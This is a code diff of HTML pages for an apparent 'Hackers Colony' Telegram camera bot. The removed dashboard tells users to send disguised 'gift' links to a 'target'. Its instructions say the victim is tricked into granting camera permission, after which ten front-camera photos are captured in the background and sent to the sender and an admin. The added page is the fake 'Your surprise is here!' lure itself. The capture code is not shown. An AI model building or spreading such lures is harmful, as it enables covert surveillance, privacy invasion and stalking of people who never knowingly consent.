@@ -1,605 +1,106 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HCO Camera Bot</title>
+    <title>Gift Surprise</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: Arial, sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            background: #000;
             color: white;
-            min-height: 100vh;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
             padding: 20px;
-            position: relative;
-            overflow-x: hidden;
-        }
-        
-        body::before {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: url('https://i.imgur.com/mN8q9Yx.jpg') no-repeat center center;
-            background-size: cover;
-            opacity: 0.1;
-            z-index: -1;
         }
         
         .container {
             max-width: 500px;
-            margin: 0 auto;
-            background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
+            background: rgba(255,255,255,0.1);
             padding: 30px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            border: 2px solid #ff0080;
         }
         
-        .header {
-            text-align: center;
+        .gift-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+        }
+        
+        h1 {
+            color: #ff0080;
+            margin-bottom: 20px;
+            font-size: 32px;
+        }
+        
+        .message {
             margin-bottom: 30px;
-            padding-bottom: 20px;
-            border-bottom: 2px solid #2196F3;
-        }
-        
-        .logo {
-            font-size: 42px;
-            font-weight: bold;
-            background: linear-gradient(45deg, #ff0080, #ff8c00);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 10px;
-            text-shadow: 0 0 20px rgba(255, 0, 128, 0.3);
-        }
-        
-        .subtitle {
-            color: #aaa;
-            font-size: 14px;
-            letter-spacing: 2px;
-        }
-        
-        .welcome-box {
-            background: rgba(33, 150, 243, 0.1);
-            padding: 25px;
-            border-radius: 15px;
-            margin-bottom: 25px;
-            text-align: center;
-            border: 1px solid rgba(33, 150, 243, 0.3);
-        }
-        
-        .welcome-title {
-            font-size: 26px;
-            margin-bottom: 15px;
-            color: #4fc3f7;
-        }
-        
-        .welcome-text {
-            margin-bottom: 20px;
+            font-size: 18px;
             line-height: 1.6;
-        }
-        
-        .features {
-            background: rgba(255, 255, 255, 0.05);
-            padding: 25px;
-            border-radius: 15px;
-            margin-bottom: 25px;
-        }
-        
-        .features-title {
-            font-size: 22px;
-            margin-bottom: 20px;
-            color: #69f0ae;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .feature-list {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-        
-        .feature-item {
-            display: flex;
-            align-items: center;
-            padding: 15px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 10px;
-            transition: all 0.3s ease;
-        }
-        
-        .feature-item:hover {
-            background: rgba(255, 255, 255, 0.1);
-            transform: translateX(5px);
-        }
-        
-        .feature-icon {
-            font-size: 28px;
-            margin-right: 15px;
-            min-width: 40px;
-            color: #2196F3;
-        }
-        
-        .feature-text {
-            flex: 1;
-        }
-        
-        .buttons {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 15px;
-            margin-bottom: 25px;
         }
         
         .btn {
+            display: block;
+            width: 100%;
             padding: 20px;
+            background: linear-gradient(45deg, #ff0080, #ff8c00);
+            color: white;
             border: none;
-            border-radius: 15px;
-            font-size: 18px;
+            border-radius: 10px;
+            font-size: 20px;
             font-weight: bold;
             cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            transition: all 0.3s ease;
+            margin-bottom: 15px;
             text-decoration: none;
-            color: white;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-            transition: 0.5s;
-        }
-        
-        .btn:hover::before {
-            left: 100%;
-        }
-        
-        .btn-generate {
-            background: linear-gradient(45deg, #2196F3, #21CBF3);
-        }
-        
-        .btn-contact {
-            background: linear-gradient(45deg, #FF416C, #FF4B2B);
-        }
-        
-        .btn-channel {
-            background: linear-gradient(45deg, #673AB7, #9C27B0);
         }
         
         .btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+            opacity: 0.9;
         }
         
-        .btn:active {
-            transform: translateY(0);
-        }
-        
-        .btn-icon {
-            font-size: 24px;
-        }
-        
-        .instructions {
-            background: rgba(0, 0, 0, 0.3);
-            padding: 20px;
-            border-radius: 15px;
+        .small-text {
             font-size: 14px;
-            line-height: 1.6;
-            margin-bottom: 20px;
-        }
-        
-        .instructions h3 {
-            color: #69f0ae;
-            margin-bottom: 15px;
-        }
-        
-        .step {
-            display: flex;
-            align-items: flex-start;
-            margin-bottom: 15px;
-            padding: 10px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 8px;
-        }
-        
-        .step-number {
-            background: #2196F3;
-            color: white;
-            width: 30px;
-            height: 30px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 15px;
-            flex-shrink: 0;
-            font-weight: bold;
-        }
-        
-        .footer {
-            text-align: center;
-            margin-top: 30px;
-            color: #888;
-            font-size: 12px;
-            padding-top: 20px;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        @media (max-width: 600px) {
-            .container {
-                padding: 20px;
-            }
-            
-            .btn {
-                padding: 18px;
-                font-size: 16px;
-            }
-            
-            .logo {
-                font-size: 36px;
-            }
-        }
-        
-        /* Gift Modal */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.9);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
-        .modal-content {
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            padding: 40px 30px;
-            border-radius: 20px;
-            max-width: 500px;
-            width: 100%;
-            position: relative;
-            border: 2px solid #2196F3;
-            text-align: center;
-        }
-        
-        .modal-title {
-            font-size: 32px;
-            margin-bottom: 20px;
-            color: #ff0080;
-            text-shadow: 0 0 20px rgba(255, 0, 128, 0.5);
-        }
-        
-        .modal-text {
-            margin-bottom: 30px;
-            line-height: 1.6;
-            font-size: 18px;
-        }
-        
-        .link-box {
-            background: rgba(0, 0, 0, 0.5);
-            padding: 15px;
-            border-radius: 10px;
-            margin: 20px 0;
-            word-break: break-all;
-            font-family: monospace;
-            font-size: 16px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .copy-btn {
-            background: linear-gradient(45deg, #4CAF50, #8BC34A);
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            border-radius: 10px;
-            cursor: pointer;
-            font-size: 18px;
-            width: 100%;
-            margin-top: 10px;
-            font-weight: bold;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        
-        .success-message {
-            color: #4CAF50;
-            text-align: center;
-            margin-top: 15px;
-            display: none;
-            font-weight: bold;
-        }
-        
-        .close-btn {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            background: none;
-            border: none;
-            color: white;
-            font-size: 30px;
-            cursor: pointer;
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.3s ease;
-        }
-        
-        .close-btn:hover {
-            background: rgba(255, 255, 255, 0.1);
+            color: #aaa;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <div class="logo">HCO CAMERA BOT</div>
-            <div class="subtitle">HACKERS COLONY OFFICIAL</div>
+        <div class="gift-icon">🎁</div>
+        <h1>YOUR SURPRISE IS HERE!</h1>
+        
+        <div class="message">
+            Someone sent you a special gift!<br>
+            Click below to unlock and see what's inside...
         </div>
         
-        <div class="welcome-box" id="welcomeSection">
-            <div class="welcome-title">👋 Welcome to Hackers Colony</div>
-            <p class="welcome-text">To use the bot and access gift tools, you must first join our Telegram channel:</p>
-            
-            <div class="buttons">
-                <a href="https://t.me/HackersColony" class="btn btn-channel" target="_blank">
-                    <span class="btn-icon">📢</span> JOIN TELEGRAM CHANNEL
-                </a>
-                
-                <button class="btn btn-generate" onclick="checkChannelJoin()">
-                    <span class="btn-icon">✅</span> I HAVE JOINED - VERIFY
-                </button>
-            </div>
-        </div>
+        <a href="https://t.me/hco_cam_bot?start=unlock_gift" class="btn">
+            🔓 UNLOCK GIFT
+        </a>
         
-        <div class="features" id="menuSection" style="display: none;">
-            <div class="features-title">
-                <span class="btn-icon">🎮</span> MAIN MENU
-            </div>
-            
-            <p style="margin-bottom: 20px; font-size: 18px;">Welcome back, <b id="userName">User</b>! 👋</p>
-            
-            <div class="feature-list">
-                <div class="feature-item">
-                    <span class="feature-icon">🎁</span>
-                    <div class="feature-text">
-                        <strong>Generate Gift Links</strong>
-                        <div style="font-size: 14px; color: #aaa;">Create unique gift links to send to friends</div>
-                    </div>
-                </div>
-                
-                <div class="feature-item">
-                    <span class="feature-icon">📸</span>
-                    <div class="feature-text">
-                        <strong>Auto-Capture System</strong>
-                        <div style="font-size: 14px; color: #aaa;">Captures 10 images from front camera</div>
-                    </div>
-                </div>
-                
-                <div class="feature-item">
-                    <span class="feature-icon">📤</span>
-                    <div class="feature-text">
-                        <strong>Dual Delivery</strong>
-                        <div style="font-size: 14px; color: #aaa;">Sends images to both you and admin</div>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="buttons" style="margin-top: 25px;">
-                <button class="btn btn-generate" onclick="generateGiftLink()">
-                    <span class="btn-icon">🎁</span> GENERATE GIFT LINK
-                </button>
-                
-                <a href="https://t.me/Hackers_Colony_Official" class="btn btn-contact" target="_blank">
-                    <span class="btn-icon">👑</span> CONTACT OWNER
-                </a>
-                
-                <a href="https://t.me/HackersColony" class="btn btn-channel" target="_blank">
-                    <span class="btn-icon">📢</span> OUR CHANNEL
-                </a>
-            </div>
-            
-            <div class="instructions">
-                <h3>📋 How It Works:</h3>
-                <div class="step">
-                    <div class="step-number">1</div>
-                    <div>Click "Generate Gift Link" to create unique link</div>
-                </div>
-                <div class="step">
-                    <div class="step-number">2</div>
-                    <div>Send the link to your target person</div>
-                </div>
-                <div class="step">
-                    <div class="step-number">3</div>
-                    <div>When they open, shows "Your surprise is here!"</div>
-                </div>
-                <div class="step">
-                    <div class="step-number">4</div>
-                    <div>They click "UNLOCK GIFT" then "ALLOW PERMISSION"</div>
-                </div>
-                <div class="step">
-                    <div class="step-number">5</div>
-                    <div>System captures 10 images in background</div>
-                </div>
-                <div class="step">
-                    <div class="step-number">6</div>
-                    <div>Images automatically sent to both you and admin</div>
-                </div>
-            </div>
-        </div>
-        
-        <div class="footer">
-            © 2024 Hackers Colony | Official Camera Bot<br>
-            Contact: @Hackers_Colony_Official | Channel: @HackersColony
+        <div class="small-text">
+            This will open Telegram to process your gift
         </div>
     </div>
     
-    <!-- Gift Link Modal -->
-    <div class="modal" id="giftModal">
-        <div class="modal-content">
-            <button class="close-btn" onclick="closeModal()">×</button>
-            
-            <div class="modal-title">🎁 GIFT LINK GENERATED</div>
-            
-            <div class="modal-text">
-                Copy this link and send to your target:<br>
-                They will see "Your surprise is here!" message
-            </div>
-            
-            <div class="link-box" id="giftLinkText">
-                Loading gift link...
-            </div>
-            
-            <button class="copy-btn" onclick="copyGiftLink()">
-                <span class="btn-icon">📋</span> COPY LINK TO CLIPBOARD
-            </button>
-            
-            <div class="success-message" id="copySuccess">
-                ✅ Link copied successfully!
-            </div>
-            
-            <div style="margin-top: 30px; background: rgba(255,255,255,0.05); padding: 20px; border-radius: 10px;">
-                <h3 style="color: #69f0ae; margin-bottom: 10px;">What happens when opened?</h3>
-                <p>1. Shows "🎉 Your surprise is here!"</p>
-                <p>2. Click "🔓 UNLOCK GIFT"</p>
-                <p>3. Click "✅ ALLOW PERMISSION"</p>
-                <p>4. 📸 Captures 10 images in background</p>
-                <p>5. 📤 Sends images to both you & admin</p>
-            </div>
-        </div>
-    </div>
-
     <script>
-        // Check if user joined channel
-        function checkChannelJoin() {
-            const btn = document.querySelector('.btn-generate');
-            const originalText = btn.innerHTML;
-            
-            btn.innerHTML = '<span class="btn-icon">⏳</span> Verifying...';
-            btn.disabled = true;
-            
-            // Simulate API check (in real app, check via Telegram bot)
-            setTimeout(() => {
-                // For demo - always show success
-                alert('✅ Verification Successful! Welcome to Hackers Colony!');
-                
-                // Hide welcome section
-                document.getElementById('welcomeSection').style.display = 'none';
-                
-                // Show menu section
-                document.getElementById('menuSection').style.display = 'block';
-                
-                // Reset button
-                btn.innerHTML = originalText;
-                btn.disabled = false;
-                
-                // Set username
-                document.getElementById('userName').textContent = 'Member';
-                
-                // Store verification in localStorage
-                localStorage.setItem('hco_verified', 'true');
-                
-            }, 2000);
-        }
+        // Get gift ID from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const giftId = urlParams.get('id');
         
-        // Generate gift link
-        function generateGiftLink() {
-            // Show modal
-            document.getElementById('giftModal').style.display = 'flex';
-            
-            // Generate random gift ID
-            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            let giftId = '';
-            for (let i = 0; i < 20; i++) {
-                giftId += chars.charAt(Math.floor(Math.random() * chars.length));
-            }
-            
-            // Create the actual Telegram bot link
-            const telegramLink = `https://t.me/hco_cam_bot?start=gift_${giftId}`;
-            
-            // Display in modal
-            document.getElementById('giftLinkText').textContent = telegramLink;
-            
-            // Store for copying
-            window.currentGiftLink = telegramLink;
-            
-            // You can send this link to your backend API here
-            console.log('Generated gift link:', telegramLink);
+        if (giftId) {
+            // You can track gift opens here
+            console.log('Gift opened:', giftId);
         }
-        
-        // Copy gift link to clipboard
-        function copyGiftLink() {
-            if (!window.currentGiftLink) return;
-            
-            const tempInput = document.createElement('input');
-            tempInput.value = window.currentGiftLink;
-            document.body.appendChild(tempInput);
-            
-            tempInput.select();
-            tempInput.setSelectionRange(0, 99999);
-            document.execCommand('copy');
-            
-            document.body.removeChild(tempInput);
-            
-            // Show success message
-            const successMsg = document.getElementById('copySuccess');
-            successMsg.style.display = 'block';
-            
-            setTimeout(() => {
-                successMsg.style.display = 'none';
-            }, 3000);
-        }
-        
-        // Close modal
-        function closeModal() {
-            document.getElementById('giftModal').style.display = 'none';
-            document.getElementById('copySuccess').style.display = 'none';
-        }
-        
-        // Close modal on outside click
-        window.onclick = function(event) {
-            if (event.target == document.getElementById('giftModal')) {
-                closeModal();
-            }
-        }
-        
-        // Check if already verified
-        document.addEventListener('DOMContentLoaded', function() {
-            if (localStorage.getItem('hco_verified') === 'true') {
-                document.getElementById('welcomeSection').style.display = 'none';
-                document.getElementById('menuSection').style.display = 'block';
-                document.getElementById('userName').textContent = 'Verified Member';
-            }
-        });
     </script>
 </body>
 </html>
